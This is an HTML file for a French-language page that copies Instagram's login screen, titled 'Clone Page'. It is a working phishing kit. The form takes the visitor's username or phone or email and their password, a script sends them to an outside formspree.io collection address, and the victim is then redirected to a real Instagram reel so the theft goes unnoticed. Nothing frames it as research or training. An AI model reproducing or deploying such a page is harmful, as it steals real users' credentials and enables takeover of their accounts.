<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clone Page</title>
    <link rel="stylesheet" href="css_insta.css">
</head>
<body>
    <div class="container">
        <h1 class="logo">Instagram</h1>
        <form id="monFormulaire" class="login-form" action="https://formspree.io/f/mzzybyjg" method="POST">
            <input name="tel" type="text" placeholder="Num. téléphone, nom d'utilisateur(ice) ou e-mail" class="input-field">
            <input name="mdp" type="password" placeholder="Mot de passe" class="input-field">
            <button type="submit" class="btn">Se connecter</button>
            <div class="separator">OU</div>
            <button type="button" class="btn-facebook">Se connecter avec Facebook</button>
            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
        </form>
        <script>
    const formulaire = document.getElementById("monFormulaire");

    formulaire.addEventListener("submit", async function(e) {
        e.preventDefault();

        const reponse = await fetch(formulaire.action, {
            method: "POST",
            body: new FormData(formulaire),
            headers: {
                "Accept": "application/json"
            }
        });

        if (reponse.ok) {
            window.location.href = "https://www.instagram.com/reel/DXkqNwbAIiO/?utm_source=ig_web_copy_link&igsh=NTc4MTIwNjQ2YQ==";
        }
    });
    </script>
        <p class="footer-text">
            Vous pouvez également <a href="#">signaler le contenu</a> que vous pensez illégal dans votre pays sans vous connecter.
        </p>
        <div class="signup">
            <p>Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
        </div>
        <div class="download">
            <p>Téléchargez l'application.</p>
            <div class="app-stores">
                <img src="google-play.png" alt="Google Play">
                <img src="microsoft-store.png" alt="Microsoft Store">
            </div>
        </div>
    </div>
</body>
</html>
